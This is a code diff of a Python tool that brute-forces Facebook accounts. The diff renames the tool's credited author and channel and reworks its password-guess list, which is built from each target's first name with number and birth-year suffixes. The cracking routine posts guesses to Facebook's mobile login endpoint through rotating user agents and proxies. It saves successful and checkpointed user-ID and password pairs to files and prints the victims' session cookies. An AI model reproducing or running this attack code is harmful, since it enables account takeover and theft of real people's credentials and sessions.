@@ -207,20 +207,19 @@ def banner():
 
 
 
- ________   ____  ____    _    _______        ___    
-|  __   _| |_   ||   _|  (_)  |_   __ \     .'   `.  
-|_/  / /     | |__| |    __     | |__) |   /  .-.  \ 
-   .'.' _    |  __  |   [  |    |  __ /    | |   | | 
- _/ /__/ |  _| |  | |_   | |   _| |  \ \_  \  `-'  / 
-|________| |____||____| [___] |____| |___|  `.___.'  
+  
+
+
+ 
+  
                                                                                                   
 ┌──────────────────────────────────────         
-│ [✓] TooL By :/x1b[1;96mZHiROCracker  │         
-│ [✓] CHANNEL: https://t.me/TEAM1886   │
+│ [✓] TooL By :/ JG-shaba  │         
+│ [✓] CHANNEL: nyma   │
 │ [✓] VERSION  : 2                     │
-│ [✓] WiFi:(FTTH-KOREK-ASIA-TPLINK-    │
-│           GORANET-TISHKNET-NEWROZ)	 │
-│           > 𝐓𝐄𝐀𝐌¹⁵⁵⁷	<              │   
+│ [✓] WiFi:(FTTH-KOREK-ASIA-TPLINK)    │
+│           	 
+│           > 𝐓𝐄𝐀𝐌⁵⁵⁷	<              │   
 └──────────────────────────────────────┘
               						
                                                                    
@@ -316,50 +315,62 @@ def passwrd():
 				if len(frs)<3:
 					pass
 				else:
-					pwv.append(frs+'1122334455')
-					pwv.append(frs+'1212')
+					pwv.append(nmf)
+					pwv.append(frs+frs)
 					pwv.append(frs+'123')
-					pwv.append(frs+'@123')
+					pwv.append(frs+''+frs)
+					pwv.append('1122334455')
+					pwv.append(frs+'1988')
+					pwv.append(frs+'1989')
+					pwv.append(frs+'1990')
+					pwv.append(frs+'1991')
+					pwv.append(frs+'1992')
+					pwv.append(frs+'1993')
+					pwv.append(frs+'1994')
+					pwv.append(frs+'1995')
+					pwv.append(frs+'0750')
+					pwv.append(frs+'112233')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
-					pwv.append(frs+'54321')
-					pwv.append(frs+frs)
-					pwv.append(frs+''+frs)
-					pwv.append(frs+'1122')
-					pwv.append(frs+'112233')
-					pwv.append(frs+'12345'+frs)
-					pwv.append('123'+frs)
-					pwv.append('1234'+frs)
-					pwv.append('12345'+frs)
 					pwv.append(frs+'123456')
 					pwv.append(frs+'123456789')
 					pwv.append(frs+'1234567890')
-					pwv.append(frs+'1999')
-					pwv.append(frs+'2003')
+					pwv.append(frs+'4321')
+					pwv.append(frs+'321')
+					pwv.append(frs+'54321')
+					pwv.append('123'+frs)
+					pwv.append('1234'+frs)
+					pwv.append('12345'+frs)
+					pwv.append('123456'+frs)
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
 				else:
-					pwv.append(frs+'1122334455')
-					pwv.append(frs+'1212')
+					pwv.append(frs+frs)
 					pwv.append(frs+'123')
-					pwv.append(frs+'@123')
+					pwv.append(frs+''+frs)
+					pwv.append('1122334455')
+					pwv.append(frs+'1988')
+					pwv.append(frs+'1989')
+					pwv.append(frs+'1990')
+					pwv.append(frs+'1991')
+					pwv.append(frs+'1992')
+					pwv.append(frs+'1993')
+					pwv.append(frs+'1994')
+					pwv.append(frs+'0750')
+					pwv.append(frs+'112233')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
-					pwv.append(frs+'54321')
-					pwv.append(frs+frs)
-					pwv.append(frs+''+frs)
-					pwv.append(frs+'1122')
-					pwv.append(frs+'112233')
-					pwv.append(frs+'12345'+frs)
-					pwv.append('123'+frs)
-					pwv.append('1234'+frs)
-					pwv.append('12345'+frs)
 					pwv.append(frs+'123456')
 					pwv.append(frs+'123456789')
 					pwv.append(frs+'1234567890')
-					pwv.append(frs+'1999')
-					pwv.append(frs+'2003')
+					pwv.append(frs+'4321')
+					pwv.append(frs+'321')
+					pwv.append(frs+'54321')
+					pwv.append('123'+frs)
+					pwv.append('1234'+frs)
+					pwv.append('12345'+frs)
+					pwv.append('123456'+frs)
 				for xpwd in pwnya:
 					pwv.append(xpwd)
 			if 'mobile' in method:
@@ -369,7 +380,7 @@ def passwrd():
 			elif 'touch' in method:
 				pool.submit(cracktouch,idf,pwv)
 	print(f"\x1b[1;93m●════════════════════════⌗════════════════════════●")
-	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;97m CRACK COMPLETE 𝐙𝐇𝐈𝐑𝐎 CRACKER!')
+	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;97m CRACK COMPLETE shaba CRACKER!')
 	print(f"\x1b[1;93m●════════════════════════⌗════════════════════════●")
 	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;92m ALL [OK] 😂👍 : {h}%s '%(ok))
 	print(' \x1b[1;91m\x1b[1;96m\x1b[1;97m  GARANAWA BO CRACK \x1b[1;97m[Y]\n \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;91mCHUNA DARAWA [T]')
@@ -384,7 +395,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([P,h,Z,N,O,U])
-	sys.stdout.write(f"\r [•𝐙𝐇𝐈𝐑𝐎•] {P}{b}{loop}{P}•{b}{len(id)}{P}  • \x1b[1;92m[OK]:{P}{H}{ok}{P} • \x1b[1;91m [CP]:{P}{H}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
+	sys.stdout.write(f"\r [shaba] {P}{b}{loop}{P}•{b}{len(id)}{P}  • \x1b[1;92m[OK]:{P}{H}{ok}{P} • \x1b[1;91m [CP]:{P}{H}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -401,7 +412,7 @@ def crack(idf,pwv):
 			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r\x1b[1;91m \n⚔═══════════════════════ZHiRO-CP𒀭════════════════════════⚔\n\x1b[1;93m⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝𝐓𝐄𝐀𝐌¹⁵⁵⁷⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜ \n\x1b[1;91m└──UID: {idf}\n└──PASS: {pw}')     
+				print(f'\r\x1b[1;91m \n⚔═══════════════════════shaba-CP𒀭════════════════════════⚔\n\x1b[1;93m⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝𝐓𝐄𝐀𝐌¹⁵⁵⁷⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜ \n\x1b[1;91m└──UID: {idf}\n└──PASS: {pw}')     
 				
 				open('CP/'+cp,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -411,7 +422,7 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;96m \n⚔═══════════════════════ZHiRO-OK✔︎════════════════════════⚔\n\x1b[1;93m⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝𝐓𝐄𝐀𝐌¹⁵⁵⁷⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜ \n\x1b[1;96m|└──USER-ID🔍: {idf}\n|└──PASSWORD🔒: {pw}\n|└──COOKIES🍪: {kuki}')
+				print(f'\r\x1b[1;96m \n⚔═══════════════════════shaba-OK✔︎════════════════════════⚔\n\x1b[1;93m⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝⇝𝐓𝐄𝐀𝐌¹⁵⁵⁷⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜⇜ \n\x1b[1;96m|└──USER-ID🔍: {idf}\n|└──PASSWORD🔒: {pw}\n|└──COOKIES🍪: {kuki}')
 				(f'\r\x1b[1;92m----------------------------------------------------------')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				break
